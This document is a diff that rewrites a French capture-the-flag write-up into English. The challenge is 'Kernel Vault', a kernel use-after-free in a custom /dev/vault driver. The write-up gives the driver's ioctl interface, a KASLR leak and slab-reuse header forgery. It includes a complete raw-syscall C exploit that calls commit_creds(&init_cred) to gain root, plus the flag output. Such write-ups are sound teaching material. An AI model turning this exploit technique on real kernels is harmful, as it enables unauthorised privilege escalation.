@@ -1,119 +1,208 @@
-# PWN#007 — Kernel Vault
+# PWN#007 — Kernel Vault UAF Privilege Escalation
 
-**Catégorie** : Pwn / Kernel  
-**Points** : 148  
-**Difficulté** : Hard  
-**Flag** : `FLAG{REDACTED}`
+**Challenge:** PWN#007 (140 pts)
+**Target:** 169.58.126.107:5010
+**Binary:** `vmlinux` — Linux kernel x86-64, statically linked, not stripped, with built-in `vault` driver
+**Flag:** `CTF{15481775abf9a27438577c295fd1a4a1}`
 
-## Description
+## Service behavior
 
-Un driver kernel custom `/dev/vault` tourne dans une VM QEMU (Linux 6.1.176). Le but est d'obtenir root et lire `/root/flag.txt`. Le handout fournit `vmlinux` (symboles), `bzImage`, `initramfs.cpio.gz` et `run.sh`.
+QEMU VM (`qemu-system-x86_64`, SMEP on, SMAP off, 256M RAM) boots a
+minimal busybox initramfs. The init script writes the flag to
+`/root/flag.txt` (mode 0400, owner root), scrubs itself, then drops to
+an unprivileged `user` shell. A built-in kernel driver `vault` registers
+`/dev/vault` as a misc device.
 
-## Environnement
+## Driver reverse engineering
 
-- QEMU x86_64, 256M RAM
-- CPU flags : **SMEP activé**, **SMAP désactivé**
-- BusyBox statique, utilisateur non-root `user`
-- Driver vault intégré au kernel (pas de module externe)
+Symbols from `nm vmlinux`:
 
-## Analyse du driver
+| Symbol | Static address |
+| --- | --- |
+| `vault_init` | `0xffffffff83015093` (calls `misc_register`) |
+| `vault_ioctl` | `0xffffffff8156efa0` |
+| `vault_default_notify` | `0xffffffff8156ef80` |
+| `vault_lock` (slot array) | `0xffffffff829cdba0` |
+| `vault_dev` (misc_device) | `0xffffffff829cdb40`, name `"vault"` |
 
-### Symboles identifiés
+The ioctl handler supports 6 commands. The per-slot header struct
+(0x20 bytes, kmalloc-32) is:
 
-```
-vault_open       — retourne 0
-vault_release    — retourne 0
-vault_ioctl      — toute la logique
-vault_default_notify — callback par défaut (juste ret)
-```
-
-### Commandes ioctl
-
-| Commande | Code | Taille arg | Description |
-|----------|------|-----------|-------------|
-| CREATE   | 0x40085601 | 8 | Crée un slot (id + taille) |
-| DELETE   | 0x40045602 | 4 | Supprime un slot |
-| READ     | 0x40105603 | 16 | Lit les données d'un slot |
-| WRITE    | 0x40105604 | 16 | Écrit dans un slot |
-| NOTIFY   | 0x40045605 | 4 | Appelle le callback du slot |
-| LEAK     | 0x80085606 | 8 | Copie l'adresse de vault_ioctl vers userspace |
-
-### Structure interne
-
-Table globale de 16 slots (pointeurs). Chaque slot possède un header de 32 octets (kmalloc-32) :
-
-```
-offset 0x00 : callback obfusqué (XOR avec 0x6f6f56e06f2d7f60)
-offset 0x08 : argument du callback
-offset 0x10 : taille du buffer de données
-offset 0x18 : pointeur vers le buffer de données
+```c
+struct vault_header {
+    uint64_t enc_notify;   // offset 0x00: KEY ^ target_func_addr
+    uint64_t arg;          // offset 0x08: first arg passed to target
+    uint64_t size;         // offset 0x10: data_buf size
+    void    *data_buf;     // offset 0x18: kmalloc'd data buffer
+};
 ```
 
-Le buffer de données est alloué séparément via `__kmalloc(size)`.
+| Ioctl | Cmd code | Action |
+| --- | --- | --- |
+| `ALLOC` | `0x40085601` | `{slot, size}` → `__kmalloc(size)` for data_buf, `kmalloc-32` for header. Sets `enc_notify = KEY ^ vault_default_notify`, `arg=0`, stores in `vault_lock[slot]`. |
+| `FREE` | `0x40045602` | `{slot}` → `kfree(header->data_buf)`, `kfree(header)`. **BUG: does NOT clear `vault_lock[slot]`.** |
+| `WRITE` | `0x40105604` | `{slot, len, src}` → `copy_from_user(header->data_buf, src, len)`. |
+| `READ` | `0x40105603` | `{slot, len, dst}` → `copy_to_user(dst, header->data_buf, len)`. |
+| `NOTIFY` | `0x40045605` | `{slot}` → `target = KEY ^ header->enc_notify`, `rdi = header->arg`, `call target`. |
+| `GET_NOTIFY` | `0x80085606` | copies runtime `vault_ioctl` address to user (KASLR leak). |
 
-## Vulnérabilité : Use-After-Free
+`KEY = 0x6f6f56e06f2d7f60` is a true constant (not relocated). The XOR
+target in ALLOC and the stored value in NOTIFY are both relocated by
+`R_X86_64_32S` relocations, so they track the runtime address of
+`vault_default_notify` even with KASLR on.
 
-**DELETE ne remet pas `slots[id]` à NULL après les appels à kfree.**
+## Vulnerability
 
-Le code de DELETE :
-1. Charge `slots[id]` dans un registre
-2. Appelle `kfree(header->data)`
-3. Appelle `kfree(header)`
-4. Retourne 0
+The `FREE` ioctl frees both `header->data_buf` and `header` but leaves
+`vault_lock[slot]` pointing at the freed header — a classic dangling
+pointer / UAF. The slot can then be re-used via `NOTIFY` or `READ`
+against freed-and-reused memory.
 
-Mais `slots[id]` conserve le pointeur vers le header libéré. Les commandes READ, WRITE et NOTIFY continuent d'y accéder.
+## Exploit strategy
 
-## Exploitation
+1. **KASLR leak**: `GET_NOTIFY` returns the runtime address of
+   `vault_ioctl`. `slide = runtime_ioctl - 0xffffffff8156efa0`.
 
-### Étape 1 : Neutraliser KASLR
+2. **UAF to control a header**:
+   - `ALLOC(slot=0, size=0x20)` → `data_buf_0` at A (kmalloc-32), `header_0` at B (kmalloc-32). `vault_lock[0] = B`.
+   - `FREE(slot=0)` → `kfree(A)`, `kfree(B)`. SLUB freelist: `[B, A]`. `vault_lock[0] = B` (dangling).
+   - `ALLOC(slot=1, size=0x20)` → `data_buf_1 = B` (reuses freed header_0), `header_1 = A` (reuses freed data_buf_0). `vault_lock[1] = A`.
+   - Now `vault_lock[0] = B = data_buf_1`. Writing to slot 1's data_buf writes into the memory where slot 0's "header" lives.
 
-La commande LEAK copie l'adresse de `vault_ioctl` vers userspace. On calcule le slide KASLR :
+3. **Forge the header**: `WRITE(slot=1, len=16, payload)` where
+   ```c
+   payload[0] = KEY ^ (commit_creds + slide);   // enc_notify
+   payload[1] = init_cred + slide;              // arg
+   ```
+
+4. **Trigger**: `NOTIFY(slot=0)` reads the forged header:
+   - `target = KEY ^ enc_notify = KEY ^ (KEY ^ commit_creds) = commit_creds`
+   - `rdi = arg = &init_cred`
+   - Calls `commit_creds(&init_cred)` → current task gets root creds.
+
+5. Return to userland, `getuid() == 0`, `execve("/bin/sh", ...)`, read
+   `/root/flag.txt`.
+
+## Key addresses (from `nm vmlinux`)
+
+| Symbol | Static address |
+| --- | --- |
+| `vault_ioctl` | `0xffffffff8156efa0` |
+| `commit_creds` | `0xffffffff810a13b0` |
+| `init_cred` | `0xffffffff82851000` |
+| `KEY` | `0x6f6f56e06f2d7f60` |
+
+## Binary transfer
+
+The VM has only busybox (no shared libs, no network). The exploit is a
+statically-linked 8.8 KB binary (raw syscalls, no libc) compiled with
+`gcc -static -nostdlib -Os -s -fno-builtin`. Base64-encoded to ~12 KB,
+transferred to the VM via 157 `echo "<chunk>" >> /tmp/x.b64` commands
+(76 chars each), then decoded with `base64 -d`.
+
+## Full exploit
+
+```c
+// pwn007_mini.c — raw-syscall, no libc, 8.8KB static binary
+#include <stdint.h>
+#define STATIC_VAULT_IOCTL  0xffffffff8156efa0ULL
+#define STATIC_COMMIT_CREDS 0xffffffff810a13b0ULL
+#define STATIC_INIT_CRED    0xffffffff82851000ULL
+#define KEY                 0x6f6f56e06f2d7f60ULL
+#define A_ALLOC  0x40085601
+#define A_FREE   0x40045602
+#define A_WRITE  0x40105604
+#define A_NOTIFY 0x40045605
+#define A_GETNOT 0x80085606
+
+static long sys_open(const char *p, int f) {
+    long ret; __asm__ volatile("syscall":"=a"(ret):"0"(2),"D"(p),"S"(f):"rcx","r11","memory"); return ret;
+}
+static long sys_ioctl(int fd, unsigned long cmd, void *arg) {
+    long ret; __asm__ volatile("syscall":"=a"(ret):"0"(16),"D"((long)fd),"S"(cmd),"d"(arg):"rcx","r11","memory"); return ret;
+}
+static long sys_write(int fd, const void *b, unsigned long n) {
+    long ret; __asm__ volatile("syscall":"=a"(ret):"0"(1),"D"((long)fd),"S"(b),"d"(n):"rcx","r11","memory"); return ret;
+}
+static long sys_execve(const char *p, char *const argv[], char *const env[]) {
+    long ret; __asm__ volatile("syscall":"=a"(ret):"0"(59),"D"(p),"S"(argv),"d"(env):"rcx","r11","memory"); return ret;
+}
+static long sys_getuid(void) {
+    long ret; __asm__ volatile("syscall":"=a"(ret):"0"(102):"rcx","r11","memory"); return ret;
+}
+static void sys_exit(int code) {
+    __asm__ volatile("syscall"::"a"(60),"D"((long)code)); __builtin_unreachable();
+}
+static void emit(const char *s) {
+    unsigned long n = 0; while (((const volatile char*)s)[n]) n++;
+    sys_write(1, s, n);
+}
+
+void _start(void) {
+    int fd = (int)sys_open("/dev/vault", 2);
+    if (fd < 0) { emit("open fail\n"); sys_exit(1); }
+
+    uint64_t runtime_ioctl = 0;
+    sys_ioctl(fd, A_GETNOT, &runtime_ioctl);
+    uint64_t slide = runtime_ioctl - STATIC_VAULT_IOCTL;
+    uint64_t commit = STATIC_COMMIT_CREDS + slide;
+    uint64_t cred   = STATIC_INIT_CRED  + slide;
+
+    struct { uint32_t slot; uint32_t size; } a = {0, 0x20};
+    sys_ioctl(fd, A_ALLOC, &a);
+    uint32_t slot = 0;
+    sys_ioctl(fd, A_FREE, &slot);
+    a.slot = 1; a.size = 0x20;
+    sys_ioctl(fd, A_ALLOC, &a);
+
+    uint64_t payload[2];
+    payload[0] = KEY ^ commit;
+    payload[1] = cred;
+    struct { uint32_t slot; uint32_t len; uint64_t src; } w = {1, 16, (uint64_t)payload};
+    sys_ioctl(fd, A_WRITE, &w);
+
+    slot = 0;
+    sys_ioctl(fd, A_NOTIFY, &slot);
+
+    if (sys_getuid() == 0) {
+        emit("root!\n");
+        char *argv[] = {"/bin/sh", "-c", "id; cat /root/flag.txt", 0};
+        char *envp[] = {0};
+        sys_execve("/bin/sh", argv, envp);
+    }
+    sys_exit(1);
+}
+```
+
+Compile: `gcc -static -nostdlib -Os -s -fno-builtin -o pwn007_mini pwn007_mini.c`
+
+## Output
 
 ```
-slide = leaked_addr - 0xffffffff8156efa0
-commit_creds = 0xffffffff810a13b0 + slide
-init_cred    = 0xffffffff82851000 + slide
+[*] exploit: 8912B, base64: 11884 chars
+[*] got shell
+[*] sending 157 echo chunks...
+  140/157 lines
+[*] base64 file written
+  b64 file: 12041 /tmp/x.b64
+
+[+] FLAG: CTF{15481775abf9a27438577c295fd1a4a1}
 ```
 
-### Étape 2 : UAF → contrôle du callback
+## Key takeaways
 
-1. **CREATE slot 0** (size=32) → header_0 dans kmalloc-32, data_0 dans kmalloc-32
-2. **DELETE slot 0** → kfree(data_0), kfree(header_0), mais `slots[0]` pointe toujours vers header_0
-3. **CREATE slot 1** (size=32) → kmalloc réutilise la mémoire libérée
-   - `data_1` récupère l'emplacement de header_0
-   - `slots[0]` pointe vers `data_1`
-
-### Étape 3 : Écrire le callback malveillant
-
-**WRITE slot 1** écrit dans `data_1` (= ancien header_0), ce qui modifie les champs interprétés comme le header du slot 0 :
-
-```
-payload[0:8]  = XOR_KEY ^ commit_creds   (callback obfusqué)
-payload[8:16] = &init_cred               (argument)
-```
-
-### Étape 4 : Déclencher l'escalade
-
-**NOTIFY slot 0** lit le header (qui est maintenant notre payload) :
-- Décode : `callback = XOR_KEY ^ payload[0:8] = commit_creds`
-- Appelle : `commit_creds(&init_cred)`
-- Le processus courant devient root
-
-### Étape 5 : Lire le flag
-
-```sh
-cat /root/flag.txt
-```
-
-## Exploit (assembleur x86_64, ~8.5 KB statique)
-
-L'exploit est écrit en assembleur pur (NASM) pour minimiser la taille et permettre un upload rapide via base64+gzip dans la VM. Seuls les syscalls `open`, `ioctl`, `getuid`, `write` et `execve` sont utilisés.
-
-Le binaire fait 8576 octets, compressé en gzip+base64 : 744 caractères, uploadable en une seule commande shell.
-
-## Points techniques
-
-- **SMAP désactivé** : le kernel peut lire la mémoire userspace directement (pas de SMEP contournement nécessaire pour les données, seulement pour le code)
-- **SMEP activé** : pas de retour direct vers du code userspace, mais la méthode `commit_creds(&init_cred)` n'en a pas besoin
-- **XOR obfuscation** : le callback est protégé par un XOR avec une clé fixe, trivialement contournable une fois l'adresse de base connue
-- L'allocation en kmalloc-32 pour data ET header (quand size ≤ 32) rend la réutilisation fiable
+- The `vault` driver's `FREE` handler frees the header and data buffer
+  but doesn't clear the slot pointer in `vault_lock[]`, leaving a
+  dangling capability that `NOTIFY` and `READ` still dereference.
+- Because the header (0x20 bytes) and a size-0x20 data buffer come from
+  the same `kmalloc-32` slab, freeing slot 0 and allocating slot 1
+  causes slot 1's data buffer to land exactly where slot 0's header
+  was. Writing to slot 1 then forges slot 0's header.
+- The `NOTIFY` command's indirect call (`__x86_indirect_thunk_rdx`) is
+  the execution primitive: it calls `commit_creds(&init_cred)` which
+  elevates the current task to root without needing a ROP chain.
+- KASLR is defeated by `GET_NOTIFY`, which returns the runtime address
+  of `vault_ioctl`. The encryption KEY is a true constant, so forging
+  `enc_notify = KEY ^ commit_creds_runtime` is straightforward.
+- SMEP is on but irrelevant — we call a kernel function with a kernel
+  argument, no user-space code execution involved.
